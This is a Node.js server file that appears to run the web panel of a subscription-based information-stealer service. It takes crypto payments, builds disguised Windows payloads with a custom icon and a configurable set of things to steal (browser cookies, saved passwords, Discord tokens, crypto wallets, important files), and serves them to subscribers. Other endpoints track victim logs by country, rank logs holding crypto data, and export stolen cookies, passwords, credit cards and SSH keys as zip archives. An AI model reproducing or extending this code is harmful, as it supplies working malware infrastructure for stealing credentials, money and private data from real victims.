                    status: invoice.status,
                    paid: invoice.status === 'paid' || invoice.status === 'completed',
                    amount: invoice.amount,
                    currency: invoice.currency
                });
            } catch (err) {
                if (provider === 'bitpapa') {
                    throw err;
                }
            }
        }
        
        return res.status(500).json({ message: 'Payment system not configured' });
        
    } catch (error) {
        console.error('Error checking invoice:', error);
        if (error.message && error.message.includes('not found')) {
            return res.status(404).json({ message: 'Invoice not found' });
        }
        res.status(500).json({ message: 'Failed to check invoice status' });
    }
});

// Payment webhook handler - receives payment confirmations from NOWPayments and Bitpapa
app.post('/api/payment/webhook', express.raw({ type: 'application/json' }), (req, res) => {
    try {
        // Parse the webhook body
        let body;
        if (Buffer.isBuffer(req.body)) {
            body = JSON.parse(req.body.toString());
        } else {
            body = req.body;
        }
        
        console.log('Payment webhook received:', JSON.stringify(body, null, 2));
        
        let username, planId, days, orderId, provider;
        
        // Detect provider and parse webhook
        if (body.payment_status || body.payment_id) {
            // NOWPayments webhook
            provider = 'NOWPayments';
            
            // Verify IPN signature if configured
            if (NOWPAYMENTS_IPN_SECRET) {
                const crypto = require('crypto');
                const signature = req.headers['x-nowpayments-sig'];
                const payload = JSON.stringify(body);
                const expectedSig = crypto
                    .createHmac('sha512', NOWPAYMENTS_IPN_SECRET)
                    .update(payload)
                    .digest('hex');
                
                if (signature !== expectedSig) {
                    console.error('Invalid NOWPayments webhook signature');
                    return res.status(401).send('Invalid signature');
                }
            }
            
            // Check if payment is confirmed
            if (body.payment_status !== 'finished' && body.payment_status !== 'confirmed') {
                return res.status(200).send('OK');
            }
            
            orderId = body.order_id || '';
            
        } else if (body.invoice_id || body.id || body.status) {
            // Bitpapa webhook
            provider = 'Bitpapa';
            
            // Check if payment is confirmed
            if (body.status !== 'paid' && body.status !== 'completed') {
                return res.status(200).send('OK');
            }
            
            orderId = body.order_id || body.orderId || '';
        } else {
            // Unknown webhook format
            console.log('Unknown webhook format, ignoring');
            return res.status(200).send('OK');
        }
        
        // Parse subscription info from order_id: sub_username_planId_days_timestamp
        const orderIdParts = orderId.split('_');
        
        if (orderIdParts.length < 4 || orderIdParts[0] !== 'sub') {
            console.error(`Invalid order_id format from ${provider}:`, orderId);
            return res.status(200).send('OK');
        }
        
        username = orderIdParts[1];
        planId = orderIdParts[2];
        days = parseInt(orderIdParts[3], 10);
        
        if (!username || !days || isNaN(days)) {
            console.error(`Invalid order_id data from ${provider}:`, { username, planId, days });
            return res.status(200).send('OK');
        }
        
        // Activate subscription
        const success = userDb.addSubscriptionDays(username, days);
        
        if (success) {
            const paymentId = body.payment_id || body.invoice_id || body.id || 'unknown';
            console.log(`✓ [${provider}] Payment confirmed! Activated ${days} days for user ${username.substring(0, 8)}... (Payment ID: ${paymentId})`);
        } else {
            console.error(`Failed to activate subscription for user ${username.substring(0, 8)}...`);
        }
        
        res.status(200).send('OK');
        
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(200).send('OK'); // Always return 200 to prevent retries
    }
});

// Get available subscription plans
app.get('/api/payment/plans', (req, res) => {
    const plans = Object.entries(SUBSCRIPTION_PLANS).map(([id, plan]) => ({
        id,
        name: plan.name,
        days: plan.days,
        price: plan.price,
        currency: plan.currency
    }));
    
    const hasWallets = Object.values(WALLET_ADDRESSES).some(addr => addr && addr.trim() !== '');
    
    res.json({ 
        plans, 
        cryptoBotEnabled: !!(NOWPAYMENTS_API_KEY || BITPAPA_API_TOKEN), // Keep name for frontend compatibility
        nowPaymentsEnabled: !!NOWPAYMENTS_API_KEY,
        bitpapaEnabled: !!BITPAPA_API_TOKEN,
        manualPaymentsEnabled: hasWallets,
        wallets: WALLET_ADDRESSES
    });
});

// Submit manual payment (user provides transaction hash)
app.post('/api/payment/submit', authenticateToken, (req, res) => {
    try {
        const username = req.user.username;
        const { planId, cryptoCurrency, transactionHash } = req.body;
        
        if (!planId || !SUBSCRIPTION_PLANS[planId]) {
            return res.status(400).json({ message: 'Invalid plan selected' });
        }
        
        if (!cryptoCurrency || !['BTC', 'ETH', 'USDT'].includes(cryptoCurrency)) {
            return res.status(400).json({ message: 'Invalid cryptocurrency. Use BTC, ETH, or USDT' });
        }
        
        if (!transactionHash || transactionHash.trim().length < 10) {
            return res.status(400).json({ message: 'Transaction hash is required' });
        }
        
        const plan = SUBSCRIPTION_PLANS[planId];
        const walletAddress = WALLET_ADDRESSES[cryptoCurrency];
        
        if (!walletAddress || walletAddress.trim() === '') {
            return res.status(400).json({ message: `Wallet address for ${cryptoCurrency} is not configured` });
        }
        
        // Check if this transaction hash was already submitted
        const existingByHash = db.prepare('SELECT * FROM pending_payments WHERE transaction_hash = ?').get(transactionHash.trim());
        if (existingByHash) {
            return res.status(400).json({ message: 'This transaction hash has already been submitted' });
        }
        
        // Create pending payment record
        const paymentId = pendingPaymentsDb.create({
            username,
            planId,
            planName: plan.name,
            days: plan.days,
            amount: plan.price,
            currency: plan.currency,
            cryptoCurrency,
            transactionHash: transactionHash.trim()
        });
        
        console.log(`Payment submitted by ${username.substring(0, 8)}...: ${plan.name} plan, ${cryptoCurrency} tx: ${transactionHash.substring(0, 16)}...`);
        
        res.json({
            success: true,
            message: 'Payment submitted successfully. Your subscription will be activated after verification.',
            paymentId
        });
        
    } catch (error) {
        console.error('Error submitting payment:', error);
        res.status(500).json({ message: error.message || 'Failed to submit payment' });
    }
});

// Get user's pending payments
app.get('/api/payment/pending', authenticateToken, (req, res) => {
    try {
        const username = req.user.username;
        const payments = pendingPaymentsDb.getByUsername(username);
        res.json({ payments });
    } catch (error) {
        console.error('Error fetching pending payments:', error);
        res.status(500).json({ message: 'Failed to fetch pending payments' });
    }
});

// Admin: Get all pending payments
app.get('/api/payment/admin/pending', authenticateToken, (req, res) => {
    try {
        // Check if user is admin (you can add admin check here)
        const payments = pendingPaymentsDb.getAll('pending');
        res.json({ payments });
    } catch (error) {
        console.error('Error fetching pending payments:', error);
        res.status(500).json({ message: 'Failed to fetch pending payments' });
    }
});

// Admin: Verify payment and activate subscription
app.post('/api/payment/admin/verify/:paymentId', authenticateToken, (req, res) => {
    try {
        const { paymentId } = req.params;
        const verifiedBy = req.user.username;
        
        const payment = pendingPaymentsDb.getById(parseInt(paymentId));
        if (!payment) {
            return res.status(404).json({ message: 'Payment not found' });
        }
        
        if (payment.status !== 'pending') {
            return res.status(400).json({ message: `Payment is already ${payment.status}` });
        }
        
        // Verify payment
        pendingPaymentsDb.verify(parseInt(paymentId), verifiedBy);
        
        // Activate subscription
        const success = userDb.addSubscriptionDays(payment.username, payment.days);
        
        if (success) {
            console.log(`✓ Payment verified by ${verifiedBy}: Activated ${payment.days} days for user ${payment.username.substring(0, 8)}...`);
            res.json({
                success: true,
                message: `Subscription activated for ${payment.username}`
            });
        } else {
            res.status(500).json({ message: 'Failed to activate subscription' });
        }
        
    } catch (error) {
        console.error('Error verifying payment:', error);
        res.status(500).json({ message: error.message || 'Failed to verify payment' });
    }
});

// Admin: Reject payment
app.post('/api/payment/admin/reject/:paymentId', authenticateToken, (req, res) => {
    try {
        const { paymentId } = req.params;
        const verifiedBy = req.user.username;
        
        const payment = pendingPaymentsDb.getById(parseInt(paymentId));
        if (!payment) {
            return res.status(404).json({ message: 'Payment not found' });
        }
        
        pendingPaymentsDb.reject(parseInt(paymentId), verifiedBy);
        
        console.log(`✗ Payment rejected by ${verifiedBy}: Payment ID ${paymentId} for user ${payment.username.substring(0, 8)}...`);
        
        res.json({
            success: true,
            message: 'Payment rejected'
        });
        
    } catch (error) {
        console.error('Error rejecting payment:', error);
        res.status(500).json({ message: error.message || 'Failed to reject payment' });
    }
});

// ==================== End NOWPayments Integration ====================

// Lazy-load rcedit to avoid startup errors if not installed
let rcedit = null;
const getRcedit = () => {
    if (!rcedit) {
        try {
            rcedit = require('rcedit');
        } catch (e) {
            console.error('rcedit not installed. Run: npm install rcedit');
            return null;
        }
    }
    return rcedit;
};

// Helper function to apply icon using rcedit
const applyIconToExe = async (exePath, iconPath) => {
    const rceditModule = getRcedit();
    if (!rceditModule) {
        throw new Error('rcedit not installed. Run: npm install rcedit');
    }
    
    await rceditModule(exePath, { icon: iconPath });
};

// Payload generation endpoint - creates a standalone exe with embedded config
app.post('/api/payloads/generate', authenticateToken, (req, res) => {
    // Handle multipart form data for icon upload
    uploadIcon(req, res, async (err) => {
        if (err) {
            console.error('Upload error:', err);
            return res.status(400).json({ message: err.message || 'Error uploading icon' });
        }

        let tempExePath = null;
        let iconPath = req.file ? req.file.path : null;

        try {
            const username = req.user.username;
            
            // Parse features from form data (sent as JSON string)
            let features, user, outputName;
            try {
                features = req.body.features ? JSON.parse(req.body.features) : null;
                user = req.body.user;
                outputName = req.body.outputName;
            } catch (parseErr) {
                // Fallback for JSON body (backwards compatibility)
                features = req.body.features;
                user = req.body.user;
                outputName = req.body.outputName;
            }

            // Check subscription status
            if (!userDb.hasActiveSubscription(username)) {
                return res.status(403).json({ 
                    message: 'Active subscription required to build payloads',
                    subscriptionRequired: true
                });
            }

            if (!features || typeof features !== 'object') {
                return res.status(400).json({ message: 'features object is required' });
            }

            // Verify that the user matches the authenticated user
            if (user && user !== username) {
                return res.status(403).json({ message: 'Cannot generate payloads for other users' });
            }

            // Path to the payload executable
            const payloadPath = path.join(__dirname, '..', 'data_collector.exe');

            // Check if payload exists
            if (!fs.existsSync(payloadPath)) {
                return res.status(500).json({ message: 'Payload executable not found. Please build the payload first.' });
            }

            // Get server URL from environment or construct from request
            const serverUrl = process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}/api/upload`;

            console.log(`Generating payload for user ${username} with server URL: ${serverUrl}`);
            console.log(`Selected features:`, features);
            if (iconPath) {
                console.log(`Custom icon provided: ${iconPath}`);
            }

            // If an icon is provided, we need to work with a temp file
            let exeBuffer;
            
            if (iconPath) {
                // Create a temp copy of the exe to modify
                tempExePath = path.join(os.tmpdir(), `payload-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.exe`);
                fs.copyFileSync(payloadPath, tempExePath);
                
                // Apply the icon using rcedit
                try {
                    await applyIconToExe(tempExePath, iconPath);
                    console.log('Custom icon applied successfully');
                    exeBuffer = fs.readFileSync(tempExePath);
                } catch (iconError) {
                    console.error('Failed to apply icon:', iconError);
                    // Continue without icon on error
                    exeBuffer = fs.readFileSync(payloadPath);
                }
            } else {
                // No icon, use original exe
                exeBuffer = fs.readFileSync(payloadPath);
            }

            // Create the configuration JSON that will be appended
            const configJson = JSON.stringify({
                user: username,
                serverUrl: serverUrl,
                collectLocation: features.location || false,
                collectSystemInfo: features.systemInfo || false,
                collectRunningProcesses: features.runningProcesses || false,
                collectInstalledApps: features.installedApps || false,
                collectBrowserCookies: features.browserCookies || false,
                collectSavedPasswords: features.savedPasswords || false,
                collectBrowserHistory: features.browserHistory || false,
                collectDiscordTokens: features.discordTokens || false,
                collectCryptoWallets: features.cryptoWallets || false,
                collectImportantFiles: features.importantFiles || false
            });

            // Create buffer with marker + config
            const markerBuffer = Buffer.from(CONFIG_MARKER, 'utf-8');
            const configBuffer = Buffer.from(configJson, 'utf-8');

            // Combine exe + marker + config
            const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, configBuffer]);

            // Sanitize output filename (remove invalid chars, ensure .exe extension)
            let filename = outputName || `payload_${username}_${Date.now()}`;
            filename = filename.replace(/[<>:"/\\|?*]/g, '_'); // Remove invalid Windows filename chars
            if (!filename.toLowerCase().endsWith('.exe')) {
                filename += '.exe';
            }

            // Set response headers for exe download
            res.setHeader('Content-Type', 'application/octet-stream');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
            res.setHeader('Content-Length', finalBuffer.length);

            console.log(`Sending patched payload: ${filename} (${finalBuffer.length} bytes)`);

            // Send the patched exe
            res.send(finalBuffer);

        } catch (error) {
            console.error('Error generating payload:', error);
            res.status(500).json({ message: 'Internal server error', error: error.message });
        } finally {
            // Cleanup temp files
            if (tempExePath && fs.existsSync(tempExePath)) {
                try { fs.unlinkSync(tempExePath); } catch (e) { /* ignore */ }
            }
            if (iconPath && fs.existsSync(iconPath)) {
                try { fs.unlinkSync(iconPath); } catch (e) { /* ignore */ }
            }
        }
    });
});

app.get('/api/stats', (req, res) => {
    try {
        const stats = logsDb.getStats();
        res.json(stats);
    } catch (error) {
        console.error('Error fetching stats:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.get('/api/statistics', authenticateToken, (req, res) => {
    console.log('Statistics endpoint hit!');
    try {
        const username = req.user.username;
        
        // Get all logs and filter by user
        let logs = logsDb.getAll();
        logs = logs.filter(log => {
            const logUser = log.user;
            if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
                return username === 'account';
            }
            return logUser === username;
        });
        
        const totalLogs = logs.length;
        
        // Calculate country distribution
        const countryCounts = {};
        logs.forEach(log => {
            const country = log.country || 'Unknown';
            countryCounts[country] = (countryCounts[country] || 0) + 1;
        });
        
        // Sort countries by count
        const countryDistribution = Object.entries(countryCounts)
            .map(([country, count]) => ({ country, count }))
            .sort((a, b) => b.count - a.count);

        // Calculate log trends (last 30 days)
        const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
        const dailyLogs = {};
        
        logs.forEach(log => {
            const logDate = new Date(log.date);
            if (logDate >= thirtyDaysAgo) {
                const dateKey = logDate.toISOString().split('T')[0];
                dailyLogs[dateKey] = (dailyLogs[dateKey] || 0) + 1;
            }
        });

        // Create array of daily log counts for last 30 days
        const last30Days = [];
        for (let i = 29; i >= 0; i--) {
            const date = new Date();
            date.setDate(date.getDate() - i);
            const dateKey = date.toISOString().split('T')[0];
            last30Days.push({
                date: dateKey,
                count: dailyLogs[dateKey] || 0
            });
        }

        // Calculate important logs (logs with crypto-related data)
        const cryptoKeywords = ['crypto', 'bitcoin', 'wallet', 'exodus', 'electrum', 'coinbase', 'metamask', 'binance'];
        let importantLogs = 0;
        let regularLogs = 0;

        logs.forEach(log => {
            const hasCrypto = log.pcData && (
                (log.pcData.browserHistory && JSON.stringify(log.pcData.browserHistory).toLowerCase().match(cryptoKeywords.join('|'))) ||
                (log.pcData.browserCookies && JSON.stringify(log.pcData.browserCookies).toLowerCase().match(cryptoKeywords.join('|'))) ||
                (log.pcData.installedApps && log.pcData.installedApps.some(app => 
                    cryptoKeywords.some(keyword => app.name.toLowerCase().includes(keyword))
                ))
            );
            
            if (hasCrypto) {
                importantLogs++;
            } else {
                regularLogs++;
            }
        });

        // Calculate totals for different data types
        let totalHistoryEntries = 0;
        let totalCookies = 0;
        let totalProcesses = 0;
        let totalApps = 0;

        logs.forEach(log => {
            if (log.dataSummary) {
                totalHistoryEntries += log.dataSummary.historyEntries || 0;
                totalCookies += log.dataSummary.cookies || 0;
                totalProcesses += log.dataSummary.processes || 0;
                totalApps += log.dataSummary.installedApps || 0;
            }
        });

        const stats = logsDb.getStats();

        res.json({
            totalLogs,
            allClients: stats.allClients,
            onlineClients: stats.onlineClients,
            deadClients: stats.deadClients,
            countryDistribution,
            last30Days,
            importantLogs,
            regularLogs,
            totals: {
                historyEntries: totalHistoryEntries,
                cookies: totalCookies,
                processes: totalProcesses,
                apps: totalApps
            }
        });
    } catch (error) {
        console.error("Error calculating statistics:", error);
        res.status(500).send('Error calculating statistics');
    }
});

app.get('/api/download/:logId', (req, res) => {
    try {
        const { logId } = req.params;
        const log = logsDb.getById(logId);
        
        if (!log) {
            return res.status(404).json({ message: 'Log not found for download' });
        }

        const archiver = require('archiver');
        const archive = archiver('zip', {
            zlib: { level: 9 } // Maximum compression
        });

        // Set response headers
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename="${logId}_data.zip"`);

        // Handle archive errors
        archive.on('error', (err) => {
            console.error('Archive error:', err);
            if (!res.headersSent) {
                res.status(500).json({ message: 'Error creating archive', error: err.message });
            }
        });

        // Pipe archive data to response
        archive.pipe(res);

        // Add main log data as JSON
        const logData = {
            id: log.id,
            sessionId: log.sessionId,
            ip: log.ip,
            country: log.country,
            date: log.date,
            user: log.user || null,
            dataSummary: log.dataSummary,
            pcData: log.pcData
        };

        archive.append(JSON.stringify(logData, null, 2), { name: 'log_data.json' });

        // Helper function to check if a cookie is non-expired
        const isCookieNonExpired = (cookie) => {
            if (!cookie || cookie.expires === undefined || cookie.expires === null) {
                return true; // Session cookie or no expiration - consider it valid
            }
            
            // expires_utc is in microseconds since Windows epoch (1601-01-01)
            const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
            
            // If expires is 0, it's a session cookie (never expires)
            if (cookie.expires === 0) {
                return true;
            }
            
            try {
                // Convert microseconds to milliseconds, then subtract epoch difference
                const expiresMs = (cookie.expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
                const expiresDate = new Date(expiresMs);
                
                // Validate the date is reasonable
                if (isNaN(expiresDate.getTime())) {
                    return true; // If we can't parse it, assume it's valid
                }
                
                // Check if expiration is in the future
                return expiresDate > new Date();
            } catch (e) {
                return true; // If parsing fails, assume it's valid
            }
        };

        // Add separate files for large data sections if they exist
        if (log.pcData) {
            const pcData = log.pcData;
            
            // Browser cookies - separate into valid and invalid
            if (pcData.browserCookies) {
                let cookies = [];
                
                // Parse cookies from string or array
                if (typeof pcData.browserCookies === 'string') {
                    try {
                        cookies = JSON.parse(pcData.browserCookies);
                    } catch (e) {
                        // If parsing fails, try to extract cookie data from string
                        cookies = [];
                    }
                } else if (Array.isArray(pcData.browserCookies)) {
                    cookies = pcData.browserCookies;
                }
                
                if (Array.isArray(cookies) && cookies.length > 0) {
                    const validCookies = [];
                    const invalidCookies = [];
                    
                    cookies.forEach(cookie => {
                        const cookieText = `Domain: ${cookie.domain || cookie.host || 'N/A'}\n` +
                                        `Name: ${cookie.name || 'N/A'}\n` +
                                        `Path: ${cookie.path || 'N/A'}\n` +
                                        `Value: ${cookie.value || 'N/A'}\n` +
                                        `Secure: ${cookie.secure || cookie.isSecure ? 'Yes' : 'No'}\n` +
                                        `HttpOnly: ${cookie.httpOnly || cookie.isHttpOnly ? 'Yes' : 'No'}\n` +
                                        `Expires: ${cookie.expires || cookie.expires_utc || 'Session Cookie'}\n` +
                                        `---\n`;
                        
                        if (isCookieNonExpired(cookie)) {
                            validCookies.push(cookieText);
                        } else {
                            invalidCookies.push(cookieText);
                        }
                    });
                    
                    // Add valid cookies file
                    if (validCookies.length > 0) {
                        archive.append(validCookies.join('\n'), { name: 'valid_cookies.txt' });
                    }
                    
                    // Add invalid/expired cookies file
                    if (invalidCookies.length > 0) {
                        archive.append(invalidCookies.join('\n'), { name: 'invalid_cookies.txt' });
                    }
                } else {
                    // If cookies couldn't be parsed as array, save as JSON
                    const cookiesData = typeof pcData.browserCookies === 'string' 
                        ? pcData.browserCookies 
                        : JSON.stringify(pcData.browserCookies, null, 2);
                    archive.append(cookiesData, { name: 'browser_cookies.json' });
                }
            }

            // Browser history
            if (pcData.browserHistory) {
                archive.append(JSON.stringify(pcData.browserHistory, null, 2), { name: 'browser_history.json' });
            }

            // Discord tokens
            if (pcData.discordTokens && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0) {
                archive.append(JSON.stringify(pcData.discordTokens, null, 2), { name: 'discord_tokens.json' });
            }

            // Running processes
            if (pcData.runningProcesses && Array.isArray(pcData.runningProcesses) && pcData.runningProcesses.length > 0) {
                archive.append(JSON.stringify(pcData.runningProcesses, null, 2), { name: 'running_processes.json' });
            }

            // Installed apps
            if (pcData.installedApps && Array.isArray(pcData.installedApps) && pcData.installedApps.length > 0) {
                archive.append(JSON.stringify(pcData.installedApps, null, 2), { name: 'installed_apps.json' });
            }

            // System info
            if (pcData.systemInfo) {
                archive.append(JSON.stringify(pcData.systemInfo, null, 2), { name: 'system_info.json' });
            }

            // Crypto wallets
            if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
                archive.append(JSON.stringify(pcData.cryptoWallets, null, 2), { name: 'crypto_wallets.json' });
            }

            // Crypto wallet folders
            if (pcData.cryptoWalletFolders && Array.isArray(pcData.cryptoWalletFolders) && pcData.cryptoWalletFolders.length > 0) {
                archive.append(JSON.stringify(pcData.cryptoWalletFolders, null, 2), { name: 'crypto_wallet_folders.json' });
            }

            // Saved passwords
            if (pcData.savedPasswords && Array.isArray(pcData.savedPasswords) && pcData.savedPasswords.length > 0) {
                archive.append(JSON.stringify(pcData.savedPasswords, null, 2), { name: 'saved_passwords.json' });
            }

            // Credit cards
            if (pcData.creditCards && Array.isArray(pcData.creditCards) && pcData.creditCards.length > 0) {
                archive.append(JSON.stringify(pcData.creditCards, null, 2), { name: 'credit_cards.json' });
            }

            // Autofill addresses
            if (pcData.autofillAddresses && Array.isArray(pcData.autofillAddresses) && pcData.autofillAddresses.length > 0) {
                archive.append(JSON.stringify(pcData.autofillAddresses, null, 2), { name: 'autofill_addresses.json' });
            }

            // Important files (FileZilla, Steam, VPNs, SSH keys, etc.)
            if (pcData.importantFiles && Array.isArray(pcData.importantFiles) && pcData.importantFiles.length > 0) {
                // Save metadata JSON
                const importantFilesMetadata = pcData.importantFiles.map(f => ({
                    fileName: f.fileName,
                    fileType: f.fileType,
                    filePath: f.filePath,
                    fileSize: f.fileSize,
                    lastModified: f.lastModified,
                    hasContent: !!f.fileContent
                }));
                archive.append(JSON.stringify(importantFilesMetadata, null, 2), { name: 'important_files.json' });
                
                // Create separate folder for actual file contents
                pcData.importantFiles.forEach((file, index) => {
                    if (file.fileContent) {
                        try {
                            // Decode base64 content
                            const buffer = Buffer.from(file.fileContent, 'base64');
                            // Sanitize filename for path
                            const safeName = file.fileName.replace(/[<>:"/\\|?*]/g, '_');
                            const safeType = file.fileType.replace(/[<>:"/\\|?*]/g, '_');
                            archive.append(buffer, { name: `important_files/${safeType}/${safeName}` });
                        } catch (e) {
                            console.error(`Error processing important file ${file.fileName}:`, e);
                        }
                    }
                });
            }

            // PC Information summary
            const pcInfo = {
                screenSize: pcData.screenSize,
                dateTime: pcData.dateTime,
                ipAddress: pcData.ipAddress,
                location: pcData.location
            };
            archive.append(JSON.stringify(pcInfo, null, 2), { name: 'pc_information.json' });
        }

        // Finalize the archive
        archive.finalize();
    } catch (error) {
        console.error('Error downloading log:', error);
        if (!res.headersSent) {
            res.status(500).json({ message: 'Internal server error', error: error.message });
        }
    }
});

// Serve static files from the React app (AFTER API routes)
app.use(express.static(path.join(__dirname, 'client/build')));

// Handle React routing, return all requests to React app
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Server listening on 0.0.0.0:${PORT} (accessible from all interfaces)`);
    console.log(`Database initialized and ready`);
});
